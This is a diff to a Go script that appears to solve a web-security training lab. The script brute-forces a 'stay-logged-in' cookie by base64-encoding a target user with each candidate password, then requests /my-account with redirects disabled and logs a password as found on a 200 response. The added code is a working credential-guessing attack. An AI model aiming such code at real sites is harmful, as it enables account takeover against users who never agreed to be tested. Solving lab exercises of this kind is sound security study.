@@ -1,12 +1,13 @@
 package main
 
 import (
-	"fmt"
-	"log"
-	"io/ioutil"
-	"strings"
 	"crypto/md5"
 	base64 "encoding/base64"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
+	"strings"
 )
 
 func solve(hostname string) {
@@ -39,9 +40,16 @@ func solve(hostname string) {
 	for _, password := range candidatePasswords {
 		cookieValue := createCookieValue(targetUser, password)
 		log.Printf("Cookie value: %s", cookieValue)
+		foundValue, err := attemptToAccessMyAccount(hostname, cookieValue)
+		if err != nil {
+			log.Printf("Error while trying to access my account: %s", err)
+		}
+
+		if foundValue {
+			log.Printf("Found password! It is: %s", password)
+		}
 	}
 }
-
 
 func readFromFile(filePath string) ([]string, error) {
 	fileBytes, err := ioutil.ReadFile(filePath)
@@ -59,9 +67,38 @@ func createCookieValue(user string, password string) string {
 	return base64.StdEncoding.EncodeToString([]byte(dataToEncode))
 }
 
+func attemptToAccessMyAccount(hostname string, cookieValue string) (bool, error) {
+
+	url := fmt.Sprintf("%s/my-account", hostname)
+	req, err := http.NewRequest(http.MethodGet, url, nil)
+
+	if err != nil {
+		return false, err
+	}
+
+	cookie := http.Cookie{Name: "stay-logged-in", Value: cookieValue}
+	req.AddCookie(&cookie)
+
+	client := makeClientWithoutRedirect()
+	resp, err := client.Do(req)
+	if err != nil {
+		return false, err
+	}
+
+	return resp.StatusCode == http.StatusOK, nil
+}
+
+func makeClientWithoutRedirect() *http.Client {
+	return &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+}
+
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
-	hardcodedHostname := "https://ac8e1f801fbb4814c0091036004300a6.web-security-academy.net"
+	hardcodedHostname := "https://acbc1fed1ea58c6480a3f7ea004d005d.web-security-academy.net"
 	solve(hardcodedHostname)
 }
